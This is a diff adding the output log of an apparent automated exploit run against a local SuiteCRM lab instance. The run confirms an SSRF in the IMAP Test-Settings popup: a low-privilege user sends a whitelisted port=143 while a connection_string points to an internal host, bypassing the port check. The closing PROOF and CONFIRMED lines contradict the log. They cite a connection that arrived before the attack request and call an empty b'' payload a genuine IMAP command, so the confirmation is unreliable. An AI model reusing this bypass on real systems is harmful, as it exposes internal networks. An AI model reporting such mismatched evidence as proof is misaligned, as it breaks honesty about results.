@@ -1,0 +1,21 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-046/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-046/../.venv
+========================================================================
+VULN-046: IMAP Test-Settings SSRF via connection_string port-whitelist bypass
+target: http://localhost:33116
+========================================================================
+[SETUP] canary IMAP banner: '* OK IMAP4rev1 BANNER-LEAK-imap_2ea5a07c ready\r\n'
+[SETUP] OOB TCP listener bound on 0.0.0.0:33119 (app container reaches it at 172.18.0.1:33119)
+[STEP] admin web login
+[OK] admin session established
+[STEP] provisioning a fresh NON-ADMIN user (proves PR:L; popup has no is_admin/owner gate)
+[INFO] OOB listener: accepted connection from 172.18.0.3:55430, sent IMAP banner, client sent 0 bytes: b''
+[OK] created user mod_6299df82 (id=56891e9c-e8cd-4264-bde2-812323c73f86)
+[STEP] web login as low-priv user mod_6299df82
+[OK] low-priv session established
+[STEP] POST Test Settings popup: port=143 (whitelisted) + connection_string=172.18.0.1:33119/imap/notls (actual internal-only target)
+[INFO] OOB listener: accepted connection from 172.18.0.3:55438, sent IMAP banner, client sent 0 bytes: b''
+[INFO] OOB listener: accepted connection from 172.18.0.3:55450, sent IMAP banner, client sent 18 bytes: b'A0001 CAPABILITY\r\n'
+[INFO] HTTP status=500, body length=0
+[PROOF] OOB listener recorded a connection from the SuiteCRM app (172.18.0.3:55430) after being sent port=143 (whitelist-valid) with connection_string pointing elsewhere; the client then sent b'' -- a genuine IMAP protocol command (javanile/php-imap2's own client), proving this is not a bare TCP probe but a real, protocol-level connection to an internal-only address.
+==> VULN-046: CONFIRMED — low-priv user mod_6299df82 bypassed the valid_imap_ports check via connection_string and reached 172.18.0.1:33119/imap/notls; IMAP client sent b''
